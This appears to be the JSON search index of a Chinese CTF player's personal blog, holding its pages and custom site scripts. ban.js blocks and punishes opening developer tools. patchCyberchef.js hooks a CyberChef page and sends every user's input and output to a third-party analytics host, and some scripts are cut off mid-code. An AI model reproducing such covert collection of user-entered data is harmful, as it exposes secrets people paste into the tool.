{"meta":{"title":"s1rius' space","subtitle":"天狼的个人空间","description":"欢迎来到天狼的个人空间</br>这里有网络安全和其他技术文章","author":"s1rius","url":"https://s1rius.space","root":"/"},"pages":[{"title":"about me","date":"2018-12-12T14:14:36.000Z","updated":"2018-12-12T14:14:36.000Z","comments":false,"path":"about/index.html","permalink":"https://s1rius.space/about/index.html","excerpt":"","text":"s1rius 🚩 CTFer | 🌐 Web萌新 👨‍💻 男 | 🎂 03年5月 | 🎓 21级 | 🧠 INTP 🔧 以Web为主，也会些Misc 🛡️ CloudEver战队成员 🐧 Arch Linux! 🏸 会打羽毛球 | 🪖 军迷 | 🌌 对天文也有兴趣 自己写的可公开的小玩意 有贡献的他人项目或二开的别人的 我的2024年github总结 #article-container img { margin: 0 auto; }"},{"title":"bangumi","date":"2019-02-10T13:32:48.000Z","updated":"2019-02-10T13:32:48.000Z","comments":false,"path":"bangumis/index.html","permalink":"https://s1rius.space/bangumis/index.html","excerpt":"","text":""},{"title":"analytics","date":"2022-09-03T04:27:32.000Z","updated":"2022-09-03T04:27:32.000Z","comments":false,"path":"analytics/index.html","permalink":"https://s1rius.space/analytics/index.html","excerpt":"","text":""},{"title":"categories","date":"2022-11-23T05:57:05.000Z","updated":"2022-11-23T05:57:05.000Z","comments":false,"path":"categories/index.html","permalink":"https://s1rius.space/categories/index.html","excerpt":"","text":""},{"title":"comment","date":"2018-12-20T15:13:48.000Z","updated":"2018-12-20T15:13:48.000Z","comments":true,"path":"comment/index.html","permalink":"https://s1rius.space/comment/index.html","excerpt":"","text":"念两句诗 叙别梦、扬州一觉。 【宋代】吴文英《夜游宫·人去西楼雁杳》"},{"title":"","date":"2025-02-26T14:11:43.000Z","updated":"2025-02-26T14:11:43.000Z","comments":true,"path":"custom/ban.js","permalink":"https://s1rius.space/custom/ban.js","excerpt":"","text":"if (window.location.hostname !== \"localhost\") { // 重写console方法 console.log = function () {}; console.error = function () {}; console.warn = function () {}; // 阻止特定键盘事件 document.addEventListener( \"keydown\", function (e) { if ( (e.ctrlKey && e.shiftKey && [\"I\", \"J\", \"C\", \"i\", \"j\", \"c\"].includes(e.key)) || (e.ctrlKey && [\"u\", \"U\"].includes(e.key)) || e.key === \"F12\" ) { e.preventDefault(); btf.snackbarShow(\"你真坏，不能打开控制台喔!\"); return false; } }, true ); // 阻止Ctrl+鼠标右键 document.addEventListener( \"contextmenu\", function (e) { if (e.ctrlKey) { e.preventDefault(); btf.snackbarShow(\"你真坏，不能打开控制台喔!\"); } }, true ); (function () { var callbacks = [], timeLimit = 50, open = false; setInterval(loop, 1); return { addListener: function (fn) { callbacks.push(fn); }, cancleListenr: function (fn) { callbacks = callbacks.filter(function (v) { return v !== fn; }); }, }; function loop() { var startTime = new Date(); debugger; if (new Date() - startTime > timeLimit) { if (!open) { callbacks.forEach(function (fn) { fn.call(null); }); } open = true; window.stop(); alert(\"你真坏，请关闭控制台！\"); document.body.innerHTML = \"\"; } else { open = false; } } })().addListener(function () { window.location.reload(); }); function toDevtools() { let num = 0; let devtools = new Date(); devtools.toString = function () { num++; if (num > 1) { alert(\"你真坏，请关闭控制台！\"); window.location.href = \"about:blank\"; blast(); } }; console.log(\"\", devtools); } toDevtools(); }"},{"title":"","date":"2025-05-30T09:59:44.930Z","updated":"2025-05-30T09:59:44.930Z","comments":true,"path":"custom/emoji.json","permalink":"https://s1rius.space/custom/emoji.json","excerpt":"","text":"{\"猫猫虫\":{\"type\":\"image\",\"container\":[{\"text\":\"catbug-不准色色\",\"icon\":\"\"},{\"text\":\"catbug-不要\",\"icon\":\"\"},{\"text\":\"catbug-不要呀\",\"icon\":\"\"},{\"text\":\"catbug-亲亲\",\"icon\":\"\"},{\"text\":\"catbug-亲脸\",\"icon\":\"\"},{\"text\":\"catbug-偷偷看\",\"icon\":\"\"},{\"text\":\"catbug-偷偷给心\",\"icon\":\"\"},{\"text\":\"catbug-再见\",\"icon\":\"\"},{\"text\":\"catbug-吃掉你\",\"icon\":\"\"},{\"text\":\"catbug-吹风\",\"icon\":\"\"},{\"text\":\"catbug-呕吼\",\"icon\":\"\"},{\"text\":\"catbug-和我色色\",\"icon\":\"\"},{\"text\":\"catbug-咬你\",\"icon\":\"\"},{\"text\":\"catbug-开心\",\"icon\":\"\"},{\"text\":\"catbug-思考中\",\"icon\":\"\"},{\"text\":\"catbug-扭一扭\",\"icon\":\"\"},{\"text\":\"catbug-扭屁股\",\"icon\":\"\"},{\"text\":\"catbug-摇摇晃晃\",\"icon\":\"\"},{\"text\":\"catbug-无奈\",\"icon\":\"\"},{\"text\":\"catbug-棒\",\"icon\":\"\"},{\"text\":\"catbug-点赞\",\"icon\":\"\"},{\"text\":\"catbug-爱你\",\"icon\":\"\"},{\"text\":\"catbug-爱你2\",\"icon\":\"\"},{\"text\":\"catbug-牛\",\"icon\":\"\"},{\"text\":\"catbug-生气\",\"icon\":\"\"},{\"text\":\"catbug-睡觉\",\"icon\":\"\"},{\"text\":\"catbug-耍帅\",\"icon\":\"\"},{\"text\":\"catbug-脸红\",\"icon\":\"\"},{\"text\":\"catbug-膜拜\",\"icon\":\"\"},{\"text\":\"catbug-舔屏\",\"icon\":\"\"},{\"text\":\"catbug-贴贴\",\"icon\":\"\"},{\"text\":\"catbug-问号\",\"icon\":\"\"}]},\"bilibiliHotKey\":{\"type\":\"image\",\"container\":[{\"text\":\"bilibiliHotKey-1\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-2\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-3\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-4\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-5\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-6\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-7\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-8\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-9\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-10\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-11\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-12\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-13\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-14\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-15\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-16\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-17\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-18\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-19\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-20\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-21\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-22\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-23\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-24\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-25\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-26\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-27\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-28\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-29\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-30\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-31\",\"icon\":\"\"},{\"text\":\"bilibiliHotKey-32\",\"icon\":\"\"}]},\"bilibili动态小电视\":{\"type\":\"image\",\"container\":[{\"text\":\"bilibili_tv_gif-1\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-2\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-3\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-4\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-5\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-6\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-7\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-8\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-9\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-10\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-11\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-12\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-13\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-14\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-15\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-16\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-17\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-18\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-19\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-20\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-21\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-22\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-23\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-24\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-25\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-26\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-27\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-28\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-29\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-30\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-31\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-32\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-33\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-34\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-35\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-36\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-37\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-38\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-39\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-40\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-41\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-42\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-43\",\"icon\":\"\"},{\"text\":\"bilibili_tv_gif-44\",\"icon\":\"\"}]},\"小鲨鱼\":{\"type\":\"image\",\"container\":[{\"text\":\"smallshake-1\",\"icon\":\"\"},{\"text\":\"smallshake-2\",\"icon\":\"\"},{\"text\":\"smallshake-3\",\"icon\":\"\"},{\"text\":\"smallshake-4\",\"icon\":\"\"},{\"text\":\"smallshake-5\",\"icon\":\"\"},{\"text\":\"smallshake-6\",\"icon\":\"\"},{\"text\":\"smallshake-7\",\"icon\":\"\"},{\"text\":\"smallshake-8\",\"icon\":\"\"},{\"text\":\"smallshake-9\",\"icon\":\"\"},{\"text\":\"smallshake-10\",\"icon\":\"\"},{\"text\":\"smallshake-11\",\"icon\":\"\"},{\"text\":\"smallshake-12\",\"icon\":\"\"},{\"text\":\"smallshake-13\",\"icon\":\"\"},{\"text\":\"smallshake-14\",\"icon\":\"\"},{\"text\":\"smallshake-15\",\"icon\":\"\"},{\"text\":\"smallshake-16\",\"icon\":\"\"},{\"text\":\"smallshake-17\",\"icon\":\"\"},{\"text\":\"smallshake-18\",\"icon\":\"\"},{\"text\":\"smallshake-19\",\"icon\":\"\"},{\"text\":\"smallshake-20\",\"icon\":\"\"},{\"text\":\"smallshake-21\",\"icon\":\"\"},{\"text\":\"smallshake-22\",\"icon\":\"\"},{\"text\":\"smallshake-23\",\"icon\":\"\"},{\"text\":\"smallshake-24\",\"icon\":\"\"},{\"text\":\"smallshake-25\",\"icon\":\"\"},{\"text\":\"smallshake-26\",\"icon\":\"\"},{\"text\":\"smallshake-27\",\"icon\":\"\"},{\"text\":\"smallshake-28\",\"icon\":\"\"},{\"text\":\"smallshake-29\",\"icon\":\"\"},{\"text\":\"smallshake-30\",\"icon\":\"\"},{\"text\":\"smallshake-31\",\"icon\":\"\"},{\"text\":\"smallshake-32\",\"icon\":\"\"},{\"text\":\"smallshake-33\",\"icon\":\"\"},{\"text\":\"smallshake-34\",\"icon\":\"\"},{\"text\":\"smallshake-35\",\"icon\":\"\"},{\"text\":\"smallshake-36\",\"icon\":\"\"},{\"text\":\"smallshake-37\",\"icon\":\"\"},{\"text\":\"smallshake-38\",\"icon\":\"\"},{\"text\":\"smallshake-39\",\"icon\":\"\"},{\"text\":\"smallshake-40\",\"icon\":\"\"},{\"text\":\"smallshake-41\",\"icon\":\"\"},{\"text\":\"smallshake-42\",\"icon\":\"\"},{\"text\":\"smallshake-43\",\"icon\":\"\"},{\"text\":\"smallshake-44\",\"icon\":\"\"},{\"text\":\"smallshake-45\",\"icon\":\"\"}]},\"线条狗\":{\"type\":\"image\",\"container\":[{\"icon\":\"\",\"text\":\"linedog-不要\"},{\"icon\":\"\",\"text\":\"linedog-写不完了\"},{\"icon\":\"\",\"text\":\"linedog-准备\"},{\"icon\":\"\",\"text\":\"linedog-加油\"},{\"icon\":\"\",\"text\":\"linedog-呸\"},{\"icon\":\"\",\"text\":\"linedog-哼\"},{\"icon\":\"\",\"text\":\"linedog-喂\"},{\"icon\":\"\",\"text\":\"linedog-好棒\"},{\"icon\":\"\",\"text\":\"linedog-好痛\"},{\"icon\":\"\",\"text\":\"linedog-好耶\"},{\"icon\":\"\",\"text\":\"linedog-威胁\"},{\"icon\":\"\",\"text\":\"linedog-完成\"},{\"icon\":\"\",\"text\":\"linedog-寻找\"},{\"icon\":\"\",\"text\":\"linedog-庆祝\"},{\"icon\":\"\",\"text\":\"linedog-开心\"},{\"icon\":\"\",\"text\":\"linedog-惊\"},{\"icon\":\"\",\"text\":\"linedog-惊讶\"},{\"icon\":\"\",\"text\":\"linedog-惊讶2\"},{\"icon\":\"\",\"text\":\"linedog-打你\"},{\"icon\":\"\",\"text\":\"linedog-打你2\"},{\"icon\":\"\",\"text\":\"linedog-指\"},{\"icon\":\"\",\"text\":\"linedog-探头\"},{\"icon\":\"\",\"text\":\"linedog-摇摆\"},{\"icon\":\"\",\"text\":\"linedog-摊手\"},{\"icon\":\"\",\"text\":\"linedog-晃脚脚\"},{\"icon\":\"\",\"text\":\"linedog-期待\"},{\"icon\":\"\",\"text\":\"linedog-来了\"},{\"icon\":\"\",\"text\":\"linedog-歪头\"},{\"icon\":\"\",\"text\":\"linedog-沮丧\"},{\"icon\":\"\",\"text\":\"linedog-画圈圈\"},{\"icon\":\"\",\"text\":\"linedog-略\"},{\"icon\":\"\",\"text\":\"linedog-盯\"},{\"icon\":\"\",\"text\":\"linedog-看窗外1\"},{\"icon\":\"\",\"text\":\"linedog-看窗外2\"},{\"icon\":\"\",\"text\":\"linedog-紧张\"},{\"icon\":\"\",\"text\":\"linedog-翘脚脚\"},{\"icon\":\"\",\"text\":\"linedog-谢谢\"},{\"icon\":\"\",\"text\":\"linedog-转圈\"},{\"icon\":\"\",\"text\":\"linedog-送你花花\"},{\"icon\":\"\",\"text\":\"linedog-难过\"},{\"icon\":\"\",\"text\":\"linedog-震惊\"},{\"icon\":\"\",\"text\":\"linedog-非常好\"},{\"icon\":\"\",\"text\":\"linedog-颓废\"}]},\"一人之下\":{\"type\":\"image\",\"container\":[{\"text\":\"一人之下-八卦\",\"icon\":\"\"},{\"text\":\"一人之下-养生\",\"icon\":\"\"},{\"text\":\"一人之下-刀\",\"icon\":\"\"},{\"text\":\"一人之下-叹气\",\"icon\":\"\"},{\"text\":\"一人之下-哎？\",\"icon\":\"\"},{\"text\":\"一人之下-埋了\",\"icon\":\"\"},{\"text\":\"一人之下-孙贼\",\"icon\":\"\"},{\"text\":\"一人之下-干翻苍穹\",\"icon\":\"\"},{\"text\":\"一人之下-打call\",\"icon\":\"\"},{\"text\":\"一人之下-承让\",\"icon\":\"\"},{\"text\":\"一人之下-抽打\",\"icon\":\"\"},{\"text\":\"一人之下-摸头\",\"icon\":\"\"},{\"text\":\"一人之下-机智\",\"icon\":\"\"},{\"text\":\"一人之下-比心\",\"icon\":\"\"},{\"text\":\"一人之下-燃\",\"icon\":\"\"},{\"text\":\"一人之下-狐狸\",\"icon\":\"\"},{\"text\":\"一人之下-瘫\",\"icon\":\"\"},{\"text\":\"一人之下-糟了\",\"icon\":\"\"},{\"text\":\"一人之下-蟑螂\",\"icon\":\"\"},{\"text\":\"一人之下-超凶\",\"icon\":\"\"},{\"text\":\"一人之下-雷\",\"icon\":\"\"}]}}"},{"title":"","date":"2025-02-23T13:56:23.369Z","updated":"2025-02-23T13:56:23.369Z","comments":true,"path":"custom/footer.js","permalink":"https://s1rius.space/custom/footer.js","excerpt":"","text":"/* 用于托管 footer 上的一些会随着时间改变的内容 footer 上的 HTML 内容： 白天的： 小破站在各种灾难中苟活了 欢迎参观我的 Space✨ 人若无名，便可专心练剑🗡 本网站由提供CDN加速服务 晚上的： 小破站在各种灾难中苟活了 欢迎参观我的 Space✨ 本网站由提供CDN加速服务 */ (function (outerDocument) { // 博客从现在距创建时间 let blogCreateTime = Date.now() - 1638288000000; // 白天和晚上时 footer 上的内容： const footerDay = `小破站在各种灾难中苟活了欢迎参观我的Space✨人若无名，便可专心练剑🗡本网站由提供CDN加速服务`; const footerNight = `小破站在各种灾难中苟活了欢迎参观我的Space✨本网站由提供CDN加速服务`; // 生成类似 xxx 天 x 小时 x 分钟 x 秒 的字符串 function getBlogAgeString() { let days = Math.floor(blogCreateTime / 86400000); let hours = Math.floor((blogCreateTime % 86400000) / 3600000); let minutes = Math.floor((blogCreateTime % 3600000) / 60000); let seconds = Math.floor((blogCreateTime % 60000) / 1000); return `${days} 天 ${hours} 小时 ${minutes} 分钟 ${seconds} 秒`; } // 根据时间将 footer 上的内容改为白天或晚上的 let hoursNow = new Date().getHours(); if (hoursNow >= 6 && hoursNow"},{"title":"","date":"2025-02-23T13:56:23.370Z","updated":"2025-02-23T13:56:23.370Z","comments":true,"path":"custom/nav.js","permalink":"https://s1rius.space/custom/nav.js","excerpt":"","text":"/* * @Author: s1rius * @Date: 2025-01-22 08:59:05 * @LastEditTime: 2025-01-25 09:21:11 * @Description: https://s1rius.space/ */ document.addEventListener(\"pjax:complete\", tonav); document.addEventListener(\"DOMContentLoaded\", tonav); //响应pjax function tonav() { document .getElementById(\"name-container\") .setAttribute(\"style\", \"display:none\"); var position = $(window).scrollTop(); $(window).scroll(function () { var scroll = $(window).scrollTop(); if (scroll > position) { document.getElementById(\"name-container\").setAttribute(\"style\", \"\"); document .getElementsByClassName(\"menus_items\")[1] .setAttribute(\"style\", \"display:none!important\"); } else { document .getElementsByClassName(\"menus_items\")[1] .setAttribute(\"style\", \"\"); document .getElementById(\"name-container\") .setAttribute(\"style\", \"display:none\"); } position = scroll; }); //修复没有弄右键菜单的童鞋无法回顶部的问题 document.getElementById(\"page-name\").innerText = document.title.split(\" | s1rius\")[0]; } function scrollToTop() { document.getElementsByClassName(\"menus_items\")[1].setAttribute(\"style\", \"\"); document .getElementById(\"name-container\") .setAttribute(\"style\", \"display:none\"); btf.scrollToDest(0, 500); }"},{"title":"","date":"2025-04-06T10:29:54.849Z","updated":"2025-04-06T10:29:54.849Z","comments":true,"path":"custom/patchCyberchef.js","permalink":"https://s1rius.space/custom/patchCyberchef.js","excerpt":"","text":"/* * @Author: s1rius * @Date: 2025-02-24 20:35:36 * @LastEditTime: 2025-04-06 18:25:20 * @Description: https://s1rius.space/ */ function getInput() { // 获取目标元素 const targetDiv = document.querySelector( \"#input-text > div > div.cm-scroller > div.cm-content.cm-lineWrapping\" ); // 提取所有文本内容（自动排除HTML标签） const textContent = targetDiv.textContent; return textContent; } function getOutput() { // 获取目标元素 const targetDiv = document.querySelector( \"#output-text > div > div.cm-scroller > div.cm-content.cm-lineWrapping\" ); // 提取所有文本内容（自动排除HTML标签） const textContent = targetDiv.textContent; return textContent; } function contentChangeHandler() { console.log(\"replace\"); const originalReplaceState = window.history.replaceState; window.history.replaceState = function (...args) { const result = originalReplaceState.apply(this, args); input = getInput(); output = getOutput(); if (!input || !output) { return result; } console.log(\"out: \", output); getScript(\"https://cloud.umami.is/script.js\", { \"data-website-id\": \"edb580f9-c557-47e7-b93d-dbd1c97d2c5e\", \"data-auto-track\": \"false\", ...option, }).then(() => { umami.track((props) => ({ ...props, name: \"cyberchef\", data: { input: input, output: output, }, })); }); return result; }; } window.onload = function () { console.log(\"onload\"); contentChangeHandler(); };"},{"title":"","date":"2025-02-23T13:56:23.370Z","updated":"2025-02-23T13:56:23.370Z","comments":true,"path":"custom/readPercent.js","permalink":"https://s1rius.space/custom/readPercent.js","excerpt":"","text":"window.onscroll = percent; // 执行函数 // 页面百分比 function percent() { let a = document.documentElement.scrollTop || window.pageYOffset, // 卷去高度 b = Math.max( document.body.scrollHeight, document.documentElement.scrollHeight, document.body.offsetHeight, document.documentElement.offsetHeight, document.body.clientHeight, document.documentElement.clientHeight ) - document.documentElement.clientHeight, // 整个网页高度 result = Math.round((a / b) * 100), // 计算百分比 up = document.querySelector(\"#go-up\"); // 获取按钮 if (result"},{"title":"","date":"2025-02-23T13:56:23.371Z","updated":"2025-02-23T13:56:23.371Z","comments":true,"path":"custom/rightmenu.js","permalink":"https://s1rius.space/custom/rightmenu.js","excerpt":"","text":"//22.12.8 update：add mask //22.12.9 update: add search in this page function setMask() { //设置遮罩层 if (document.getElementsByClassName(\"rmMask\")[0] != undefined) { return document.getElementsByClassName(\"rmMask\")[0]; } mask = document.createElement(\"div\"); mask.className = \"rmMask\"; mask.style.width = window.innerWidth + \"px\"; mask.style.height = window.innerHeight + \"px\"; mask.style.background = \"#fff\"; mask.style.opacity = \".0\"; mask.style.position = \"fixed\"; mask.style.top = \"0\"; mask.style.left = \"0\"; mask.style.zIndex = 998; document.body.appendChild(mask); document.getElementById(\"rightMenu\").style.zIndex = 19198; return mask; } function insertAtCursor(myField, myValue) { //IE 浏览器 if (document.selection) { myField.focus(); sel = document.selection.createRange(); sel.text = myValue; sel.select(); } //FireFox、Chrome等 else if (myField.selectionStart || myField.selectionStart == \"0\") { var startPos = myField.selectionStart; var endPos = myField.selectionEnd; // 保存滚动条 var restoreTop = myField.scrollTop; myField.value = myField.value.substring(0, startPos) + myValue + myField.value.substring(endPos, myField.value.length); if (restoreTop > 0) { myField.scrollTop = restoreTop; } myField.focus(); myField.selectionStart = startPos + myValue.length; myField.selectionEnd = startPos + myValue.length; } else { myField.value += myValue; myField.focus(); } } let rmf = {}; rmf.showRightMenu = function (isTrue, x = 0, y = 0) { let $rightMenu = $(\"#rightMenu\"); $rightMenu.css(\"top\", x + \"px\").css(\"left\", y + \"px\"); if (isTrue) { $rightMenu.show(); } else { $rightMenu.hide(); } }; rmf.switchDarkMode = function () { const nowMode = document.documentElement.getAttribute(\"data-theme\") === \"dark\" ? \"dark\" : \"light\"; if (nowMode === \"light\") { activateDarkMode(); saveToLocal.set(\"theme\", \"dark\", 2); GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.day_to_night); } else { activateLightMode(); saveToLocal.set(\"theme\", \"light\", 2); GLOBAL_CONFIG.Snackbar !== undefined && btf.snackbarShow(GLOBAL_CONFIG.Snackbar.night_to_day); } // handle some cases typeof utterancesTheme === \"function\" && utterancesTheme(); typeof FB === \"object\" && window.loadFBComment(); window.DISQUS && document.getElementById(\"disqus_thread\").children.length && setTimeout(() => window.disqusReset(), 200); }; rmf.yinyong = function () { var e = document.getElementsByClassName(\"el-textarea__inner\")[0], t = document.createEvent(\"HTMLEvents\"); t.initEvent(\"input\", !0, !0), (e.value = d.value = \"> \" + getSelection().toString() + \"\\n\\n\"), e.dispatchEvent(t); console.log(getSelection().toString()); document.getElementsByClassName(\"el-textarea__inner\")[0].value = \"> \" + getSelection().toString() + \"\\n\\n\"; Snackbar.show({ text: \"为保证最佳评论阅读体验，建议不要删除空行\", pos: \"top-center\", showAction: false, }); }; rmf.copyWordsLink = function () { let url = window.location.href; let txa = document.createElement(\"textarea\"); txa.value = url; document.body.appendChild(txa); txa.select(); document.execCommand(\"Copy\"); document.body.removeChild(txa); Snackbar.show({ text: \"链接复制成功！快去分享吧！\", pos: \"top-right\", showAction: false, }); }; rmf.switchReadMode = function () { const $body = document.body; $body.classList.add(\"read-mode\"); const newEle = document.createElement(\"button\"); newEle.type = \"button\"; newEle.className = \"fas fa-sign-out-alt exit-readmode\"; $body.appendChild(newEle); function clickFn() { $body.classList.remove(\"read-mode\"); newEle.remove(); newEle.removeEventListener(\"click\", clickFn); } newEle.addEventListener(\"click\", clickFn); }; //复制选中文字 rmf.copySelect = function () { document.execCommand(\"Copy\", false, null); //这里可以写点东西提示一下 已复制 }; //回到顶部 rmf.scrollToTop = function () { document.getElementsByClassName(\"menus_items\")[1].setAttribute(\"style\", \"\"); document .getElementById(\"name-container\") .setAttribute(\"style\", \"display:none\"); btf.scrollToDest(0, 500); }; rmf.translate = function () { document.getElementById(\"translateLink\").click(); }; rmf.searchinThisPage = () => { document.body.removeChild(mask); document.getElementsByClassName(\"local-search-box--input\")[0].value = window .getSelection() .toString(); document.getElementsByClassName(\"search\")[0].click(); var evt = document.createEvent(\"HTMLEvents\"); evt.initEvent(\"input\", false, false); document .getElementsByClassName(\"local-search-box--input\")[0] .dispatchEvent(evt); }; document.body.addEventListener(\"touchmove\", function (e) {}, { passive: false, }); function popupMenu() { //window.oncontextmenu=function(){return false;} window.oncontextmenu = function (event) { if (event.ctrlKey) return true; $(\".rightMenu-group.hide\").hide(); if (document.getSelection().toString()) { $(\"#menu-text\").show(); } if (document.getElementById(\"post\")) { $(\"#menu-post\").show(); } if (document.getElementById(\"body-wrap\")) { $(\"#menu-post\").show(); } else { if (document.getElementById(\"page\")) { $(\"#menu-post\").show(); } } var el = window.document.body; el = event.target; var a = /^(?:http(s)?:\\/\\/)?[\\w.-]+(?:\\.[\\w\\.-]+)+[\\w\\-\\._~:/?#[\\]@!\\$&'\\*\\+,;=.]+$/; if (a.test(window.getSelection().toString()) && el.tagName != \"A\") { $(\"#menu-too\").show(); } if (el.tagName == \"A\") { $(\"#menu-to\").show(); rmf.open = function () { if ( (el.href.indexOf(\"http://\") == -1 && el.href.indexOf(\"https://\") == -1) || el.href.indexOf(\"s1rius.space\") != -1 ) { pjax.loadUrl(el.href); } else { location.href = el.href; } }; rmf.openWithNewTab = function () { window.open(el.href); // window.location.reload(); }; rmf.copyLink = function () { let url = el.href; let txa = document.createElement(\"textarea\"); txa.value = url; document.body.appendChild(txa); txa.select(); document.execCommand(\"Copy\"); document.body.removeChild(txa); }; } if (el.tagName == \"IMG\") { $(\"#menu-img\").show(); rmf.openWithNewTab = function () { window.open(el.src); // window.location.reload(); }; rmf.click = function () { el.click(); }; rmf.copyLink = function () { let url = el.src; let txa = document.createElement(\"textarea\"); txa.value = url; document.body.appendChild(txa); txa.select(); document.execCommand(\"Copy\"); document.body.removeChild(txa); }; rmf.saveAs = function () { var a = document.createElement(\"a\"); var url = el.src; var filename = url.split(\"/\")[-1]; a.href = url; a.download = filename; a.click(); window.URL.revokeObjectURL(url); }; } else if (el.tagName == \"TEXTAREA\" || el.tagName == \"INPUT\") { $(\"#menu-paste\").show(); // rmf.paste=function(){ // input.addEventListener('paste', async event => { // event.preventDefault(); // const text = await navigator.clipboard.readText(); // el.value+=text; // }); // } rmf.paste = function () { navigator.permissions .query({ name: \"clipboard-read\", }) .then((result) => { if (result.state == \"granted\" || result.state == \"prompt\") { //读取剪贴板 navigator.clipboard.readText().then((text) => { console.log(text); insertAtCursor(el, text); }); } else { Snackbar.show({ text: \"请允许读取剪贴板！\", pos: \"top-center\", showAction: false, }); } }); }; } let pageX = event.clientX + 10; let pageY = event.clientY; let rmWidth = $(\"#rightMenu\").width(); let rmHeight = $(\"#rightMenu\").height(); if (pageX + rmWidth > window.innerWidth) { pageX -= rmWidth + 10; } if (pageY + rmHeight > window.innerHeight) { pageY -= pageY + rmHeight - window.innerHeight; } mask = setMask(); window.onscroll = () => { rmf.showRightMenu(false); window.onscroll = () => {}; //document.removeChild(mask); }; $(\".rightMenu-item\").click(() => { document.body.removeChild(mask); }); $(window).resize(() => { rmf.showRightMenu(false); //document.body.removeChild(mask); }); mask.onclick = () => { document.body.removeChild(mask); }; rmf.showRightMenu(true, pageY, pageX); return false; }; window.addEventListener(\"click\", function () { rmf.showRightMenu(false); }); } if ( !navigator.userAgent.match( /(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i ) ) { popupMenu(); } const box = document.documentElement; function addLongtabListener(target, callback) { let timer = 0; // 初始化timer target.ontouchstart = () => { timer = 0; // 重置timer timer = setTimeout(() => { callback(); timer = 0; }, 380); // 超时器能成功执行，说明是长按 }; target.ontouchmove = () => { clearTimeout(timer); // 如果来到这里，说明是滑动 timer = 0; }; target.ontouchend = () => { // 到这里如果timer有值，说明此触摸时间不足380ms，是点击 if (timer) { clearTimeout(timer); } }; } addLongtabListener(box, popupMenu);"},{"title":"","date":"2025-06-13T08:45:00.629Z","updated":"2025-06-13T08:45:00.629Z","comments":true,"path":"custom/summary.js","permalink":"https://s1rius.space/custom/summary.js","excerpt":"","text":"/* * @Author: s1rius * @Date: 2025-06-13 16:36:19 * @LastEditTime: 2025-06-13 16:44:06 * @Description: https://s1rius.space/ */ // 打字机效果 function typeTextMachineStyle(text, targetSelector, options = {}) { const { delay = 10, startDelay = 100, onComplete = null, clearBefore = true, eraseBefore = false, // 新增：是否以打字机方式清除原文本 eraseDelay = 9, // 新增：删除每个字符的间隔 } = options; const el = 